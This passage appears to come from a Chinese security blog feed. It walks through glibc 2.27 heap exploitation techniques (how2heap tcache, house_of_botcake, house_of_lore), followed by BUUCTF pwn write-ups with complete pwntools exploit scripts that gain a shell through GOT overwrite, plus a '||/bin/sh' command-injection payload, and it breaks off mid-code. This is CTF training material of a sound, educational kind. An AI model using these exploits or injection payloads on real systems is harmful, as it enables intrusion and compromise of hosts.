full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line">......</span><br><span class="line">tcache_count = TCACHE_FILL_COUNT,</span><br></pre></td></tr></table></figure><p>while语句就是将fastbin chunk移至tcache中，其中<code>REMOVE_FB</code>函数就是取出fastbin的第一个chunk链入到对应tcache头。后面检查fastbin里面是否还有chunk，没有则退出。</p><p>在源代码中，还考虑了当fastbin中的chunk数量少于7个的情况。如果fastbin没有被填满，则在链入栈区的地址后，_int_malloc还会继续检查栈区这个假chunk的fd是否为0，如果是一个无效值就会导致程序崩溃。但如果是0的话也是可以达到上面的效果，将栈区地址链入到tcache头的。但是栈区的不稳定性与可重用性决定了其在未初始化时的值不确定，所以fastbin没有填满时进行malloc有一定的风险，不一定能够成功。</p><p>理解本漏洞利用方式需要理解fastbin和tcache的交互过程，实际上也比较容易理解。既然glibc决定添加tcache，就要让其发挥最大限度的作用——成为一个比fastbin还要fast的堆块分配模块，所以这种情况下肯定是要让fastbin里面的chunk尽可能往tcache里面塞。又考虑到fast的性质，在tcache不空的时候不会触发这个过程。</p><h1 id="3-house-of-botcake"><a href="#3-house-of-botcake" class="headerlink" title="3. house_of_botcake"></a>3. house_of_botcake</h1><p>这是一种通过tcache进行的漏洞利用方法，能够让malloc返回任意地址值。</p><p>首先在栈区分配0x20空间，这是之后malloc要返回的地址。之后分配9个0x110的chunk，外加一个小chunk防止top chunk合并。然后释放前7个chunk填满tcache。然后先释放第9个再释放第8个chunk，这样释放完之后这两个chunk因为同在unsorted bin中，所以会合并。后面分配一个chunk出来，这个chunk当然是从tcache中获取（第7个chunk）。获取之后再次释放第9个chunk，此时第9个chunk被放到了tcache中，也即第9个chunk被double free，导致重叠了。</p><p>之后呢，分配一个0x130的chunk，这当然会从由第8和9个chunk合并产生的unsorted bin chunk中切割一个chunk分过去。到这里，你的眼里是否有光？我们可以通过这个chunk修改第9个chunk的指针，而这个chunk现在就在tcache的头部！我们将第9个chunk的fd指针修改为栈区我们想要的地址之后，tcache就断链了，此时tcache头部是第9个chunk，后面连着的就是我们想分配的地址。因此后面malloc两次即可。</p><p>理解本漏洞利用方法的核心在于理解堆块的重叠。堆块重叠的目的是修改tcache使其最终指向我们想要的地址，这只是一种我们修改tcache的手段而已。tcache不会检查double free。当一个chunk被double free到不同的bin时，杀伤力是最大的，因为这不可能会被检查到。glibc 2.23中的第二个源码好像也是将chunk两次free到不同的bin中。</p><h1 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h1><p>这个漏洞利用在glibc 2.23中有分析，是一种poison null byte漏洞利用方式。还是看一下和2.23有没有什么不同之处。</p><p>首先分配0x40的chunk(name: a)，然后在栈构造一个假chunk，prev size和size均为0x100，fd、bk、fd_nextsize和bk_nextsize均设为其本身。之后分配0x500的chunk(name: b)，这样b的size本来应为0x501。之后，漏洞关键步骤：a溢出一个空字节到b使得b的size变为0x500。然后调整a的prev size使得后面堆块合并的时候能够让堆块头到达想要分配的栈区地址。这里a的prev size应设为b - fake chunk，作为呼应，栈区的size也应该修改为这个值。然后将b释放即可得到一个位于栈区的堆块指针。这样看起来和2.23的没有什么不同，只是因为有tcache的存在，所以需要释放的b应该要比较大才行，大于tcache中链入chunk的最大size即可。</p><h1 id="5-house-of-force"><a href="#5-house-of-force" class="headerlink" title="5. house_of_force"></a>5. house_of_force</h1><p>这个漏洞利用在glibc 2.23中有分析。</p><p>源码中想要在bss段的地方进行写操作。首先分配0x110的chunk(name: p1)，然后修改top chunk的大小到最大，再分配一个很大的chunk使top chunk到达要写的地方的正下方，然后再分配一个chunk就能在bss段写了。这个利用方式与2.23没有区别，不再赘述。</p><h1 id="6-house-of-lore"><a href="#6-house-of-lore" class="headerlink" title="6. house_of_lore"></a>6. house_of_lore</h1><p>这是一种利用small bins的攻击手段，由于glibc 2.27中tcache的影响，具体的利用方式可能会和2.23有所区别。</p><p>和2.23相比，2.27的house_of_lore利用需要绕过更加严格的检查。</p><p><strong>Step 1: 分配8个0x110的chunk，在栈区开8*7大小的空间，其中包括0x20大小的一块（stack_buffer_1）和0x18大小的一块（stack_buffer_2）。另在栈区开7*4的指针数组。</strong></p><p>第1个会成为漏洞利用的对象，而2~8个用于后面填充tcache。</p><p><strong>Step 2: 构造栈区，将stack_buffer_1和stack_buffer_2构造为两个假的chunk，将指针数组构造为一个假的free list。</strong></p><p>在源码中，我们应该将指针数组的每一个0x20的空间看做是一个chunk，程序所做的就是为每一个假chunk的bk指针赋值使得前一个chunk的bk指向后一个chunk（最后一个chunk不赋值）。之后，将stack_buffer_1的fd指针对应偏移处指向Step 1中分配的第一个chunk，size和prev size均设为0，bk指针对应偏移处指向stack_buffer_2；将stack_buffer_2的fd指针对应偏移处指向stack_buffer_1，bk对应偏移处指向指针数组开头。如图所示。将栈区如此构造主要是为了绕过libc的检查，后面会有所解释。</p><p><img src="https://img-blog.csdnimg.cn/3de7a924c8704c7d88de38d665411f93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p><strong>Step 3: 分配0x1010的chunk消除top chunk的影响。释放2~8个chunk以填满tcache。</strong></p><p><strong>Step 4: 释放第一个chunk，它会被链入到unsorted bin中。</strong></p><p><strong>Step 5: 分配一个大chunk（0x1210），让第一个chunk进入small bins</strong></p><p>0x1210大小的chunk无法被small bins和unsorted bin处理，因此在_int_malloc函数中会在遍历的过程将第一个chunk链入到small bins中。</p><p><font color=red><strong>Step 6: 覆写第一个chunk的bk指针。</strong></font></p><p>这一步和2.23中相同，将第一个chunk的bk指针改成了stack_buffer_1的栈区地址。</p><p><strong>Step 7: 将tcache清空。</strong></p><p>将tcache清空的原因是遍历small bins时malloc会将符合大小的chunk链入到tcache中而且是逆向链入，与fastbin_reverse_into_tcache中的过程相似。这是为后面做准备。</p><p><strong>step 8: 分配出第一个chunk。</strong></p><p>注意：将第一个chunk分配出来之后，malloc会将我们在栈区构造的7个假chunk逆向链入到tcache中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x7fffffffe1e0 —▸ 0x7fffffffe1c0 —▸ 0x7fffffffe1a0 —▸ 0x7fffffffe180 —▸ 0x7fffffffe160 —▸ 0x7fffffffe0e0 —▸ 0x7fffffffe100 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x110 [corrupted]</span><br><span class="line">FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* &#x27;PruUUU&#x27; */</span><br><span class="line">BK: 0x7fffffffe1f1 ◂— 0x4000007fffffffe2</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>在libc源码中有下面这一段，构造stack_buffer_1就是为了绕过这个检查：<code>bck-&gt;fd == victim</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">       [ ... ]</span><br></pre></td></tr></table></figure><p><strong>Step 9: 再分配出一个chunk，这个chunk的地址就在栈区。</strong></p><p>由上面的bin分布可知，这个chunk的地址在0x7fffffffe1e0，妥妥的栈区。</p><p><strong>Step 10: 利用这个栈上的地址修改main函数返回地址。</strong></p><p>这里源代码的执行出现了错误，因为写入的偏移不对，修改偏移到0x68即可绕过canary直接修改返回地址。这里作者可能是误以为tcache中的第一个chunk是预先分配的7个假chunk的最后一个，如果是的话偏移为40就是正确的。但实际上这里是第5个chunk，因为有stack_buffer_1和stack_buffer_2在前，tcache中的结构应该是：</p><p><code>5th stack fake chunk -&gt; 4th -&gt; 3rd -&gt; 2nd -&gt; 1st -&gt; stack_buffer_2 -&gt; stack_buffer_1</code></p><p>这里不知道为什么作者没有注意到这个错误。</p><p>可以看到，2.27的house_of_lore和2.23还是有很大区别的，利用tcache的特性将假chunk链入到tcache中再分配以修改栈区内容。通过fastbin_reverse_into_tcache和house_of_lore我们可以发现，在malloc小块内存时，如果tcache中没有chunk而对应small bins或fastbin有，则会将这些chunk尽可能往tcache塞，顺序是先fastbin后small bins。</p><p>将small bins中的chunk链入到tcache的libc源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (5)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-5/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-5/</url>
      
        <content type="html"><![CDATA[<h1 id="buu039-ZJCTF-2019-EasyHeap"><a href="#buu039-ZJCTF-2019-EasyHeap" class="headerlink" title="buu039-[ZJCTF 2019]EasyHeap"></a>buu039-[ZJCTF 2019]EasyHeap</h1><p>一道堆题，经典的菜单，创建chunk（最多10个），编辑chunk（可以有任意长度的堆溢出），删除chunk（没有悬挂指针）。因此本题考察堆溢出。</p><p>由于本题环境在2.23，因此可以使用的堆漏洞方式比更高版本的更多。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目里面有这么一段，应该是只要能够把地址magic的位置修改成大于0x1305，然后选项填4869就能getshell。</p><p><strong>方法1：fastbin attack</strong><br>这应该是最简单的方法了。分配一些小的chunk，然后通过堆溢出直接修改chunk的fd指针。这个时候需要绕过一个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>也就是会检查fastbin的chunk的size是否正确。我们可以错位分配fastbin chunk到bss段中的heaparray中，以实现对写入地址的完全控制。</p><p><img src="https://img-blog.csdnimg.cn/07586aced18e4f8d9fd46383e318065e.png"><br>分配之后，heaparray[2]应该是0x6020B5-0x8的地址。修改magic之后调用l33t函数，但是发现没有这个文件。好家伙玩我是吧……</p><p>但是还有其他方法。我们现在控制了bss段，可以随意修改heaparray，从而实现任一地址任意长度写。因此可以修改got表，把exit或malloc等函数改成system的plt地址即可，但是由于要传入参数，所以考虑修改free.got。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28974</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># chunk #0</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># chunk #1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x100</span>, cyclic(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020B5</span> - <span class="number">8</span>))<span class="comment"># overflow chunk #1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># new chunk #1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))<span class="comment"># alloc chunk in bss, overflow chunk #0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))<span class="comment"># edit free().got to system().plt</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)<span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>方法2：unlink</strong><br>通过使用unsorted bin的unlink操作控制heaparray数组，也是一种可行的方法。具体的实现原理请参考我的how2heap系列第5、8篇文章，本题的实现原理与how2heap中unlink的演示高度相似。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28974</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># chunk #0</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;colin&#x27;</span>)<span class="comment"># chunk #1</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)<span class="comment"># chunk #2</span></span><br><span class="line">fakechunk_struct = p64(<span class="number">0</span>)</span><br><span class="line">fakechunk_struct += p64(<span class="number">0x80</span>)<span class="comment"># fake chunk size = 0x80</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x6020E0</span> - <span class="number">0x18</span>)<span class="comment"># fake chunk fd, fd-&gt;bk = fake chunk</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x6020E0</span> - <span class="number">0x10</span>)<span class="comment"># fake chunk bk, bk-&gt;fd = fake chunk</span></span><br><span class="line">fakechunk_struct += cyclic(<span class="number">0x80</span> - <span class="number">0x20</span>)</span><br><span class="line">fakechunk_struct += p64(<span class="number">0x80</span>)<span class="comment"># overwrite chunk #1 prev size</span></span><br><span class="line">fakechunk_struct += p64(<span class="number">0x90</span>)<span class="comment"># overwrite prev_in_use bit = 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, fakechunk_struct)</span><br><span class="line">delete(<span class="number">1</span>)<span class="comment"># trigger unlink, after deletion chunk #0 should be 0x6020E0 - 0x18 = 0x6020C8</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, cyclic(<span class="number">0x18</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))<span class="comment"># change chunk #0 to free().got</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))<span class="comment"># change free().got to system().plt</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>方法3：爆破修改__malloc_hook</strong><br>在方法一的fastbin attack之后，我们通过释放一个chunk到unsorted bin中能够在堆中写入main_arena+88的地址。通过分析可知__malloc_hook的地址应为main_arena - 0x10处。如果需要在这里分配一个fastbin，需要写入main_arena - 0x23来错位分配（起始地址即为下图中标出的地方），但这样需要修改最低两个字节的值，因此倒数第二低字节的高4位需要爆破，成功率为1&#x2F;16。分配到这里的地址之后，把one_gadget写入到hook中调用malloc即可。</p><p><img src="https://img-blog.csdnimg.cn/76c809f478a648e7950c095358d09319.png"><br>但是这种方法在本题中不太可行。因为本题不能读取任何数据，只能通过修改unsorted bin的fd和bk指针分配，而unsorted bin的检查比fastbin多得多，无法通过检查。如果能够将fastbin chunk的fd中写入此处的地址应该是没有问题的，但问题就在于我们无法获取其地址，只能通过修改低字节的方式修改它。</p><p>后来想想，如果真的要将fastbin chunk中的fd指针修改为main arena的地址也不是不行。方法：首先通过前两种方法获取到对heaparray的写权限，然后把一个chunk释放两次，第一次释放在fastbin中，第二次释放在unsorted bin中，两次释放之间通过堆溢出修改chunk的大小（改大）使第二次能被释放到unsorted bin中。</p><p>不过按照上面的方法就显得有点多此一举了。其思想与方法一是相同的，都是错位分配。因此这里就不再进行赘述了。感兴趣的读者可以自己实现一下。</p><h1 id="buu040-wustctf2020-getshell"><a href="#buu040-wustctf2020-getshell" class="headerlink" title="buu040-wustctf2020_getshell"></a>buu040-wustctf2020_getshell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29015</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">24</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804851B</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu041-bjdctf-2020-router"><a href="#buu041-bjdctf-2020-router" class="headerlink" title="buu041-bjdctf_2020_router"></a>buu041-bjdctf_2020_router</h1><p>nc直接连，输入1然后输入<code>||/bin/sh</code>即可。这是linux命令行特性，要知道<code>||</code>的含义：上一条命令执行失败之后执行下一条命令，远程没有ping，因此直接执行&#x2F;bin&#x2F;sh。</p><h1 id="buu042-hitcontraining-uaf"><a href="#buu042-hitcontraining-uaf" class="headerlink" title="buu042-hitcontraining_uaf"></a>buu042-hitcontraining_uaf</h1><p>经典菜单题，从题目标题就能看出来是一道考UAF的题。在del_note函数中果然出现了UAF漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[index]-&gt;strbuf);</span><br><span class="line">    <span class="built_in">free</span>(notelist[index]);<span class="comment">// 没有清空指针</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  